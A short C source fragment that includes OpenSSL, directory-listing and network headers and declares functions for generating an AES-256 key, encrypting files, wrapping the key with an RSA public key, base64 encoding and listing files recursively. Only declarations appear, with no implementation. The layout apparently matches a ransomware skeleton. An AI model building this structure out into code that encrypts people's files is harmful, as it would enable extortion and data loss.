#include <string.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <dirent.h>
#include <sys/stat.h>
#include "network.h"

#define CHUNK_SIZE 4096
#define AES_KEY_SIZE 32  // Clé AES 256 bits
#define AES_BLOCK_SIZE 16



void handleErrors(const char *error);
unsigned char *create_key(void);
void encrypt_file(const char *filepath, unsigned char *aes_key);
void encrypt_aes_key(const char *public_key_file, unsigned char *aes_key, unsigned char *encrypted_key, size_t *encrypted_key_len);
char *base64_encode(const unsigned char *input, int length);
void list_files(const char *base_path);